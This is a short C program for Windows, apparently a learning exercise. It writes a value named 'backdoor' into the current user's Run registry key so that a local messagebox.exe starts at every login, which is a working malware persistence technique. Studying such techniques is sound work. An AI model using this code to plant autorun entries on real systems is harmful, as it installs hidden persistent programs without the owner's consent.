#include <stdio.h>
#include <windows.h>
unsigned int my_strlen(char *str);
int main() {

  HKEY key_handle;
  DWORD disposition;

  LONG ret = RegCreateKeyExA(
      HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      0,    // reserved, must be zero
      NULL, // class string (optional)
      REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY,
      NULL, // security attributes
      &key_handle, &disposition);

  if (ret != ERROR_SUCCESS) {
    printf("Error with RegCreateKeyExA: %ld\n", ret);
    // FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, 0, 0, );
    return 1;
  }
  if(disposition == REG_OPENED_EXISTING_KEY) return 0;

  void *reg_key_val = "C:\\Users\\sebby\\Documents\\messagebox.exe\0";
  unsigned int key_val_size = my_strlen((char *)reg_key_val) + 1;
  ret = RegSetKeyValueA(key_handle, 0, "backdoor", REG_SZ, reg_key_val,
                        key_val_size);
  if (ret != ERROR_SUCCESS) {
    printf("Error with RegSetKeyValueA, code: %ld", ret);
    return 1;
  }

  RegCloseKey(key_handle);
  return 0;
}

unsigned int my_strlen(char *str) {
  unsigned int count = 0;
  char cur_char;
  while ((cur_char = str[count]) != '\0')
    count++;
  return count;
}
